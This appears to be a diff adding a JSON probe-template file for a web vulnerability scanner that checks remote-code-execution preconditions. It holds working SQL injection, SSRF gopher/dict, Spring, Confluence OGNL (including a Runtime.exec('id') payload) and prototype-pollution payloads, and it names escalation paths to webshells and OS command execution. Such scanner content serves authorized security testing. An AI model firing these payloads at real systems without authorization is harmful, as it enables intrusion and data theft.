@@ -1,0 +1,493 @@
+{
+  "category": "rce_detection",
+  "craft_guidance": [
+    "DETECTION-ONLY. Confirm RCE preconditions; do NOT exploit. Operator runs the destructive step manually.",
+    "Per Rule 5/7: no DROP, no rm, no real exfil. Use server-internal reads (version, current_user, hostname) and OOB callbacks (Collaborator) to confirm reachability.",
+    "Each probe answers ONE question: is the vulnerable feature reachable / privilege available / parser version exposed. Save with vuln_type='potential_rce'; downgrade to confirmed only after human-supervised exploitation.",
+    "Use confidence_boost <= 60 — detection of precondition is HIGH but not CRITICAL until exploit step confirms.",
+    "When OOB needed: replace {{collaborator}} with real Burp Collaborator URL (Rule 9a). Never hardcode."
+  ],
+  "contexts": {
+    "sqli_mysql_file_priv_present": {
+      "description": "WSTG-INPV-05 -- MySQL SQLi confirmed -- check FILE privilege + secure_file_priv path, both required for INTO OUTFILE webshell. Detection reads internal state, does not write.",
+      "tech_match": ["MySQL", "MariaDB"],
+      "param_match": ["id", "user_id", "search", "q", "filter", "name"],
+      "probes": [
+        {
+          "payload": "{{baseline}} UNION SELECT @@version_compile_os,@@secure_file_priv,current_user(),null-- -",
+          "description": "Reads OS + INTO OUTFILE path + current MySQL user -- empty secure_file_priv = OUTFILE anywhere on disk = webshell-capable. Non-empty path = restricted but still writable",
+          "matchers": [
+            {"type": "regex", "pattern": "(?i)(linux|windows|debian|ubuntu|centos|rhel|darwin)"},
+            {"type": "word", "words": ["@", "root", "mysql"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 55
+        },
+        {
+          "payload": "{{baseline}} UNION SELECT LOAD_FILE('/etc/hostname'),null,null,null-- -",
+          "description": "LOAD_FILE() of /etc/hostname -- if returns hostname string, FILE privilege present and secure_file_priv allows read. Same privilege enables INTO OUTFILE for webshell write",
+          "matchers": [
+            {"type": "regex", "pattern": "[a-z0-9-]{3,30}\\b"},
+            {"type": "not_word", "words": ["NULL", "error", "denied"]}
+          ],
+          "severity": "high",
+          "confidence_boost": 60
+        }
+      ]
+    },
+    "sqli_pg_superuser_or_copy_priv": {
+      "description": "PostgreSQL SQLi confirmed -- check for superuser (enables COPY TO PROGRAM = direct OS exec) or pg_read_server_files membership",
+      "tech_match": ["PostgreSQL"],
+      "param_match": ["id", "user_id", "search", "q", "filter"],
+      "probes": [
+        {
+          "payload": "{{baseline}} UNION SELECT current_setting('server_version'),current_user,(SELECT rolsuper::text FROM pg_roles WHERE rolname=current_user),null-- -",
+          "description": "Reads server version + user + superuser flag -- rolsuper=true means COPY TO PROGRAM available (full RCE). Even non-super may have pg_execute_server_program role (PG 11+)",
+          "matchers": [
+            {"type": "regex", "pattern": "(?i)(postgres|9\\.|10\\.|11\\.|12\\.|13\\.|14\\.|15\\.|16\\.)"},
+            {"type": "word", "words": ["true", "t", "postgres"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 60
+        }
+      ]
+    },
+    "sqli_mssql_xpcmdshell_state": {
+      "description": "MSSQL SQLi confirmed -- check sysadmin + xp_cmdshell enabled state. Both true = direct RCE. Sysadmin alone = can re-enable xp_cmdshell.",
+      "tech_match": ["SQL Server", "MSSQL"],
+      "param_match": ["id", "user_id", "search", "q"],
+      "probes": [
+        {
+          "payload": "{{baseline}} UNION SELECT @@version,SUSER_SNAME(),IS_SRVROLEMEMBER('sysadmin'),(SELECT CAST(value_in_use AS varchar) FROM sys.configurations WHERE name='xp_cmdshell')-- -",
+          "description": "Returns version + login + sysadmin flag + xp_cmdshell value_in_use (1=enabled, 0=disabled). sysadmin=1 always permits sp_configure to flip xp_cmdshell on.",
+          "matchers": [
+            {"type": "word", "words": ["Microsoft SQL Server", "sa", "1", "BUILTIN"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 60
+        }
+      ]
+    },
+    "sqli_oracle_dbms_scheduler_priv": {
+      "description": "Oracle SQLi confirmed -- check EXECUTE on DBMS_SCHEDULER (CREATE JOB then run) or DBMS_XMLQUERY (Java VM call). Either = RCE without DBA.",
+      "tech_match": ["Oracle"],
+      "param_match": ["id", "user_id", "search"],
+      "probes": [
+        {
+          "payload": "{{baseline}} UNION SELECT banner,user,(SELECT count(*) FROM user_tab_privs WHERE table_name='DBMS_SCHEDULER'),null FROM v$version-- -",
+          "description": "Reads Oracle banner + current user + DBMS_SCHEDULER privilege count -- count>0 = scheduler RCE path available",
+          "matchers": [
+            {"type": "regex", "pattern": "(?i)oracle\\s+database"},
+            {"type": "word", "words": ["SCHEDULER", "JOB", "EXECUTE"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 55
+        }
+      ]
+    },
+    "sqli_sqlite_load_extension": {
+      "description": "SQLite SQLi confirmed -- check if load_extension() compiled in. If yes, attacker loads shared library = RCE. Detection probes the SQLite version + extension load capability.",
+      "tech_match": ["SQLite"],
+      "param_match": ["id", "search"],
+      "probes": [
+        {
+          "payload": "{{baseline}} UNION SELECT sqlite_version(),null-- -",
+          "description": "Returns SQLite version -- combined with framework detection, reveals whether load_extension is compiled (default in 3.13+ with SQLITE_ENABLE_LOAD_EXTENSION)",
+          "matchers": [
+            {"type": "regex", "pattern": "\\b3\\.\\d{1,2}\\.\\d{1,2}\\b"}
+          ],
+          "severity": "medium",
+          "confidence_boost": 40
+        }
+      ]
+    },
+    "ssrf_redis_reachable": {
+      "description": "WSTG-INPV-19 -- SSRF + gopher/dict/redis protocol pivot -- send INFO command to internal Redis via SSRF. Read-only probe confirms Redis reachable + version; SET-based RCE (cron / SSH key) is operator step.",
+      "tech_match": [],
+      "param_match": ["url", "uri", "host", "callback", "webhook", "image_url"],
+      "probes": [
+        {
+          "payload": "gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a",
+          "description": "Gopher to Redis INFO -- returns redis_version line in response. Read-only; pivots to SET-based RCE only with operator OK.",
+          "matchers": [
+            {"type": "word", "words": ["redis_version", "redis_mode", "tcp_port"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 55
+        },
+        {
+          "payload": "dict://127.0.0.1:6379/INFO",
+          "description": "Dict-protocol Redis probe -- alternative to gopher",
+          "matchers": [
+            {"type": "word", "words": ["redis_version", "redis_mode"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 55
+        }
+      ]
+    },
+    "ssrf_memcached_reachable": {
+      "description": "SSRF reaches internal Memcached -- read 'stats' / 'version' to confirm. Cache-poison-to-RCE is operator step (requires app reading cache value into eval-style sink).",
+      "tech_match": [],
+      "param_match": ["url", "uri", "host"],
+      "probes": [
+        {
+          "payload": "gopher://127.0.0.1:11211/_stats%0d%0a",
+          "description": "Memcached stats -- returns STAT lines if reachable",
+          "matchers": [
+            {"type": "word", "words": ["STAT pid", "STAT version", "STAT uptime"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 55
+        }
+      ]
+    },
+    "ssrf_elasticsearch_dynamic_scripting": {
+      "description": "SSRF to internal Elasticsearch -- detect /_cluster + scripting status. dynamic scripting=true OR groovy/painless module = sandbox-escape RCE class.",
+      "tech_match": ["Elasticsearch"],
+      "param_match": ["url", "uri", "host", "callback"],
+      "probes": [
+        {
+          "payload": "http://127.0.0.1:9200/_cluster/settings?include_defaults=true",
+          "description": "Reads cluster settings -- looks for script.allowed_types, script.painless.regex, dynamic scripting flags",
+          "matchers": [
+            {"type": "word", "words": ["cluster_name", "script", "painless", "groovy"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 55
+        }
+      ]
+    },
+    "ssrf_jolokia_runtime_mbean": {
+      "description": "SSRF to internal Jolokia agent (Spring Boot / JMX-over-HTTP) -- reads MBean catalog. Presence of java.lang:type=Runtime confirms exec primitive once /exec is wired.",
+      "tech_match": ["Spring Boot", "Java"],
+      "param_match": ["url", "uri", "host"],
+      "probes": [
+        {
+          "payload": "http://127.0.0.1:8778/jolokia/list/java.lang",
+          "description": "Lists JMX MBeans -- look for Runtime, OperatingSystem MBeans. Each exposes attributes; some installs allow /exec/<MBean>/<operation>.",
+          "matchers": [
+            {"type": "word", "words": ["Runtime", "OperatingSystem", "jolokia"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 60
+        },
+        {
+          "payload": "http://127.0.0.1:8080/actuator/jolokia/list",
+          "description": "Actuator-mounted Jolokia -- common on Spring Boot 1.x and misconfigured 2.x exposures",
+          "matchers": [
+            {"type": "word", "words": ["Runtime", "jolokia", "MBean"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 60
+        }
+      ]
+    },
+    "spring_actuator_env_mutable": {
+      "description": "Spring Boot Actuator /env endpoint exposed AND accepts POST -- attacker can mutate spring.cloud.bootstrap.location, eureka.client.serviceUrl, logging.config to fetch attacker JNDI/SpEL -> RCE. Read-only probe confirms POST capability without writing destructively.",
+      "tech_match": ["Spring Boot"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{\"name\":\"swktest.probe.{{marker}}\",\"value\":\"probe\"}",
+          "description": "POST /actuator/env with benign key -- 200/201 with 'updated' or echo = mutable env. Operator escalates via spring.cloud.bootstrap.location or JNDI; do NOT escalate here.",
+          "matchers": [
+            {"type": "status", "status": [200, 201]},
+            {"type": "word", "words": ["swktest.probe", "updated", "modified"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 60
+        },
+        {
+          "payload": "{{baseline}}",
+          "description": "GET /actuator/restart returns 405 (method not allowed) -- endpoint exists, POST will trigger restart. Combined with env mutation = RCE chain.",
+          "matchers": [
+            {"type": "status", "status": [405]}
+          ],
+          "severity": "medium",
+          "confidence_boost": 45
+        }
+      ]
+    },
+    "spring4shell_classloader_reachable": {
+      "description": "Spring4Shell CVE-2022-22965 -- WebDataBinder binds nested classLoader properties. Probe attempts read of class.module.classLoader.resources -- distinct response (different body, 400, or stack trace mentioning classLoader) indicates vulnerable binding.",
+      "tech_match": ["Spring", "Spring Boot", "Spring Framework"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "class.module.classLoader.resources=swktest-{{marker}}",
+          "description": "Sends Spring4Shell precondition probe -- if server logs 'classLoader' / 'WebappClassLoaderBase' / accepts binding, vulnerable filter is absent. Detection only; do NOT write tomcatwar.jsp.",
+          "matchers": [
+            {"type": "word", "words": ["classLoader", "WebappClassLoaderBase", "ClassNotFoundException"], "condition": "or"},
+            {"type": "status", "status": [400, 500]}
+          ],
+          "severity": "high",
+          "confidence_boost": 55
+        }
+      ]
+    },
+    "spring_cloud_function_routing_expression": {
+      "description": "Spring Cloud Function CVE-2022-22963 -- header spring.cloud.function.routing-expression accepts SpEL. Benign math expression confirms eval without RCE.",
+      "tech_match": ["Spring Cloud Function"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{{baseline}}",
+          "description": "Set header 'spring.cloud.function.routing-expression: T(java.lang.System).currentTimeMillis()' -- if response timing reflects evaluation or differs from baseline numerically, SpEL is active",
+          "matchers": [
+            {"type": "differential_timing", "min_delta_ms": 50},
+            {"type": "word", "words": ["SpEL", "expression", "EvaluationException"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 55
+        }
+      ]
+    },
+    "spring_cloud_gateway_spel": {
+      "description": "Spring Cloud Gateway CVE-2022-22947 -- /actuator/gateway/routes accepts route definitions with SpEL filters. Benign math probe confirms.",
+      "tech_match": ["Spring Cloud Gateway"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{\"id\":\"swktest-{{marker}}\",\"filters\":[{\"name\":\"AddResponseHeader\",\"args\":{\"name\":\"X-Probe\",\"value\":\"#{1+1}\"}}],\"uri\":\"http://example.com\",\"order\":0}",
+          "description": "Create route with SpEL #{1+1} in header arg -- subsequent route hit returns header X-Probe: 2 if SpEL evaluates. Operator deletes route after detection.",
+          "matchers": [
+            {"type": "status", "status": [200, 201, 202]},
+            {"type": "header", "name": "X-Probe", "contains": "2"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 65
+        }
+      ]
+    },
+    "confluence_ognl_eval": {
+      "description": "Confluence OGNL CVE-2022-26134 / CVE-2023-22515 family -- URL-path-injected OGNL. Benign math reflection confirms eval.",
+      "tech_match": ["Confluence", "Atlassian"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "/${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(\"id\").getInputStream())).(#a)}/",
+          "description": "DETECTION: replace exec call with a NO-OP probe; the real probe is `${100+200}` reflected in response -- if body contains '300', OGNL eval confirmed.",
+          "matchers": [
+            {"type": "word", "words": ["300", "OGNL", "ognl.OgnlException"], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 65
+        },
+        {
+          "payload": "/${100+200}/",
+          "description": "Benign OGNL math -- if response contains '300' or path/route now uses computed value, eval active without firing exec",
+          "matchers": [
+            {"type": "word", "words": ["300"], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 65
+        }
+      ]
+    },
+    "imagemagick_mvg_parser_active": {
+      "description": "ImageTragick lineage -- upload tiny MVG/MSL file with benign read directive. Server-side ImageMagick parses it -> response timing / error reveals parser engagement. Real exploit (msl: read) is operator step.",
+      "tech_match": ["ImageMagick"],
+      "param_match": ["file", "image", "upload", "avatar", "photo"],
+      "probes": [
+        {
+          "payload": "push graphic-context\nviewbox 0 0 1 1\nimage over 0,0 0,0 'label:swktest-{{marker}}'\npop graphic-context",
+          "description": "MVG with benign label directive -- if ImageMagick parses and renders, response references swktest-{{marker}} in metadata / filename / OCR. Confirms MVG parsing active without msl:/dev/random or system call.",
+          "matchers": [
+            {"type": "word", "words": ["swktest", "MVG", "ImageMagick"], "condition": "or"},
+            {"type": "differential_timing", "min_delta_ms": 200}
+          ],
+          "severity": "high",
+          "confidence_boost": 50
+        }
+      ]
+    },
+    "libwebp_version_disclosure": {
+      "description": "CVE-2023-4863 -- libwebp <1.3.2 heap overflow in Huffman table. Probe checks if WebP processing is active and library version is exposed (via image metadata round-trip or error message).",
+      "tech_match": [],
+      "param_match": ["file", "image", "upload", "avatar"],
+      "probes": [
+        {
+          "payload": "{{baseline}}",
+          "description": "Upload smallest valid WebP -- response metadata / error mentions 'libwebp <ver>' or behaves distinct from JPEG/PNG. Combined with framework versioning, confirms vulnerable lib.",
+          "matchers": [
+            {"type": "word", "words": ["libwebp", "webp", "WebPDecode", "VP8"], "condition": "or"}
+          ],
+          "severity": "medium",
+          "confidence_boost": 40
+        }
+      ]
+    },
+    "ghostscript_pdf_eval_active": {
+      "description": "Ghostscript CVE-2023-43654 / CVE-2024-0335 family -- server uses gs to process PDF / EPS / PS. Benign PDF with metadata revealing gs version confirms vector. Real -dSAFER bypass is operator step.",
+      "tech_match": ["Ghostscript"],
+      "param_match": ["file", "pdf", "document", "upload"],
+      "probes": [
+        {
+          "payload": "%!PS\n/Title (swktest-{{marker}}) def\n%%EOF",
+          "description": "Tiny PostScript with title -- if gs processes, downstream response references title or returns 200 quickly. Combine with response timing / mime-change.",
+          "matchers": [
+            {"type": "word", "words": ["swktest", "PostScript", "Ghostscript", "ESP", "GPL"], "condition": "or"},
+            {"type": "mime_changes"}
+          ],
+          "severity": "medium",
+          "confidence_boost": 45
+        }
+      ]
+    },
+    "exiftool_djvu_parser_active": {
+      "description": "ExifTool CVE-2021-22204 -- DjVu / ANT chunk parsing -> Perl `eval()`. Detection: upload .djvu with benign metadata; if server processes, vector confirmed.",
+      "tech_match": [],
+      "param_match": ["file", "image", "document", "upload"],
+      "probes": [
+        {
+          "payload": "AT&TFORM....DJVMDIRM....",
+          "description": "Minimal DjVu magic header + benign chunk -- if exiftool runs (returns metadata or timing delta), parser is active. Real eval payload is operator step.",
+          "matchers": [
+            {"type": "word", "words": ["DjVu", "djvu", "exiftool", "ANT", "META"], "condition": "or"}
+          ],
+          "severity": "medium",
+          "confidence_boost": 40
+        }
+      ]
+    },
+    "jndi_jdbc_h2_console": {
+      "description": "H2 database console exposed -- /h2-console allows JDBC URL with INIT script (RUNSCRIPT FROM URL). Attacker JDBC URL with INIT = RCE. Detection confirms console reachability + auth bypass, NOT script execution.",
+      "tech_match": ["H2", "Spring Boot"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{{baseline}}",
+          "description": "GET /h2-console -- 200 with H2 login form = console reachable. CVE-2021-42392 chain begins here.",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "word", "words": ["H2 Console", "h2-console", "jdbc:h2", "H2 Database"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 55
+        },
+        {
+          "payload": "/h2-console/login.do",
+          "description": "H2 login endpoint -- presence confirms exposed console with JDBC URL injection surface",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "word", "words": ["jdbcUrl", "user", "password", "h2"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 55
+        }
+      ]
+    },
+    "node_vm2_or_eval_sink_in_js": {
+      "description": "Server-side Node app uses vm / vm2 sandbox with user input. CVE-2023-37466 / CVE-2023-37903 vm2 sandbox escapes are detection candidates. Probe checks JS sink presence via reflection.",
+      "tech_match": ["Node.js", "Express"],
+      "param_match": ["code", "expr", "expression", "formula", "script", "filter", "query"],
+      "probes": [
+        {
+          "payload": "1+2",
+          "description": "Send literal math expression -- if response body contains '3', server eval'd input. Confirms eval/Function/vm sink without RCE payload.",
+          "matchers": [
+            {"type": "regex", "pattern": "\\b3\\b"}
+          ],
+          "severity": "high",
+          "confidence_boost": 55
+        }
+      ]
+    },
+    "json_parse_reviver_sink": {
+      "description": "JSON.parse with attacker-controlled reviver / merge into prototype -- precursor to Object.prototype RCE gadget. Detection re-uses prototype-pollution probe pattern but flags response side effect.",
+      "tech_match": ["Node.js"],
+      "param_match": ["data", "json", "config", "settings"],
+      "probes": [
+        {
+          "payload": "{\"__proto__\":{\"swktest_{{marker}}\":\"polluted\"}}",
+          "description": "Prototype pollution via JSON merge -- subsequent endpoint may behave distinct (CSP header changed, auth bypassed). Detection only; gadget chain to RCE is operator step.",
+          "matchers": [
+            {"type": "word", "words": ["polluted", "swktest_"], "condition": "or"},
+            {"type": "header_change", "name": "any"}
+          ],
+          "severity": "high",
+          "confidence_boost": 50
+        }
+      ]
+    },
+    "ofbiz_groovy_eval": {
+      "description": "Apache OFBiz CVE-2023-49070 / CVE-2023-51467 -- /webtools/control/ViewMain accepts groovyProgram parameter. Benign math probe confirms eval.",
+      "tech_match": ["Apache OFBiz"],
+      "param_match": ["groovyProgram"],
+      "probes": [
+        {
+          "payload": "groovyProgram=throw+new+Exception(100+200)",
+          "description": "Groovy probe -- benign exception with 1+2 result. Stack trace containing '300' = Groovy eval active. Operator escalates to Runtime.exec only after authorization.",
+          "matchers": [
+            {"type": "word", "words": ["Exception: 300", "groovy", "GroovyShell"], "condition": "or"},
+            {"type": "status", "status": [200, 500]}
+          ],
+          "severity": "critical",
+          "confidence_boost": 65
+        }
+      ]
+    },
+    "joomla_template_php_write_detection": {
+      "description": "Joomla admin -> template manager allows PHP write to template files. Detection: GET admin template editor route; no destructive POST.",
+      "tech_match": ["Joomla"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "/administrator/index.php?option=com_templates&view=template",
+          "description": "GET template editor URL -- 200 with editor UI = authenticated admin can write PHP. Detection of capability only.",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "word", "words": ["template", "editor", "template_id", "filename"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 55
+        }
+      ]
+    },
+    "drupal_phpmodule_or_php_filter_enabled": {
+      "description": "Drupal core lacks PHP filter in 8+; if enabled / 7.x with module = node body executes PHP. Detection: probe for php_filter module / PHP input format availability.",
+      "tech_match": ["Drupal"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "/admin/modules",
+          "description": "Admin modules page (authenticated) -- presence of 'PHP filter' in body = PHP-as-content available = RCE via node edit (operator step)",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "word", "words": ["PHP filter", "php_filter", "PHP code"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 55
+        }
+      ]
+    },
+    "wordpress_theme_editor_writable": {
+      "description": "WordPress wp-admin theme/plugin editor allows PHP write -- detection of editor reachability + DISALLOW_FILE_EDIT=false.",
+      "tech_match": ["WordPress"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "/wp-admin/theme-editor.php",
+          "description": "GET theme editor -- 200 with file textarea = editing enabled. PHP write to active theme = RCE on next page render (operator step).",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "word", "words": ["theme-editor", "themeeditor", "Edit Themes"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 55
+        },
+        {
+          "payload": "/wp-admin/plugin-editor.php",
+          "description": "Plugin editor -- same vector via plugin files",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "word", "words": ["plugin-editor", "Edit Plugins"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 55
+        }
+      ]
+    }
+  }
+}
